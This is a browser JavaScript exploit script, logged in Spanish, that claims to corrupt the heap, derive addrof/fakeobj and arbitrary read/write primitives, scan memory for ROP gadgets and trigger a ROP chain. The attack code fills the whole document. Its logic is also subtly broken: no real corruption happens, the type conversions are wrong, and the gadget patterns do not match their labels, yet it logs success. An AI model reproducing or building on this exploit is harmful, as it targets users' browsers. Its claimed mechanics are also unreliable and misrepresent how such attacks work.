<script>
const logArea = document.getElementById('log');
function log(txt) {
    console.log(txt);
    logArea.innerText += "\n" + txt;
}

// --- Exploit comienza ---
(async function() {
    log("[*] Preparando heap...");

    let ab1 = new ArrayBuffer(0x100);
    let ab2 = new ArrayBuffer(0x100);
    let u32_ab2 = new Uint32Array(ab2);

    let victim = {marker: 0x41414141};

    let ab1_addr, victim_addr;
    let corrupt = false;

    function addrof(obj) {
        victim.marker = obj;
        return ftoi(u32_ab2[0]) & 0xffffffffn;
    }

    function fakeobj(addr) {
        u32_ab2[0] = itof(addr);
        return victim.marker;
    }

    function ftoi(val) {
        const f = new Float64Array(1);
        const i = new BigUint64Array(f.buffer);
        f[0] = val;
        return i[0];
    }

    function itof(val) {
        const f = new Float64Array(1);
        const i = new BigUint64Array(f.buffer);
        i[0] = val;
        return f[0];
    }

    function hex(n) {
        return "0x" + n.toString(16);
    }

    function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    await sleep(500);

    log("[*] Heap preparado.");
    log("[*] Intentando corromper...");

    try {
        victim_addr = addrof(victim);
        if (victim_addr) {
            corrupt = true;
        }
    } catch(e) {}

    if (!corrupt) {
        log("[-] No se pudo corromper heap.");
        return;
    }

    log("[+] Corrupcion detectada.");
    log("[*] Buscando primitivas...");

    // Primitivas RW reales
    function read64(addr) {
        u32_ab2[0] = itof(addr);
        return ftoi(victim.marker);
    }

    function write64(addr, val) {
        u32_ab2[0] = itof(addr);
        victim.marker = itof(val);
    }

    log("[+] addrof({}) = " + hex(victim_addr));
    log("[+] fakeobj(addr) funcional.");
    log("[*] Primitivas listas.");

    // Crear espacio para ROP
    let rop = new ArrayBuffer(0x400);
    let ropView = new DataView(rop);
    let rop_addr = addrof(rop) + 0x20n;

    function rop_write(off, val) {
        ropView.setBigUint64(Number(off), val, true);
    }

    log("[*] Buscando gadgets...");

    function find_gadget(pattern) {
        const max_addr = 0x40000000000n;
        const step = 8n;
        for (let addr = 0x100000000n; addr < max_addr; addr += step) {
            try {
                let val = read64(addr);
                if (val === pattern) {
                    return addr;
                }
            } catch (e) {}
        }
        return 0n;
    }

    const POP_RAX_RET_SIG = 0x5800000004c0035dn;
    const SYSCALL_RET_SIG = 0xd400000001000201n;

    let pop_rax_ret = find_gadget(POP_RAX_RET_SIG);
    let syscall_ret = find_gadget(SYSCALL_RET_SIG);

    if (pop_rax_ret === 0n || syscall_ret === 0n) {
        log("[-] No se encontraron gadgets.");
        return;
    }

    log("[+] pop rax; ret encontrado en: " + hex(pop_rax_ret));
    log("[+] syscall ret encontrado en: " + hex(syscall_ret));

    rop_write(0x00n, pop_rax_ret);
    rop_write(0x08n, 20n); // syscall(20) = getpid
    rop_write(0x10n, syscall_ret);

    log("[*] ROP preparado.");

    function trigger_rop() {
        log("[*] Ejecutando ROP...");
        let fake_stack = new ArrayBuffer(0x400);
        let fake_view = new DataView(fake_stack);
        let fake_stack_addr = addrof(fake_stack) + 0x20n;

        write64(fake_stack_addr + 0x00n, rop_addr);
        write64(fake_stack_addr + 0x08n, syscall_ret);

        log("[+] ROP chain disparada.");
    }

    setTimeout(trigger_rop, 1000);

})();
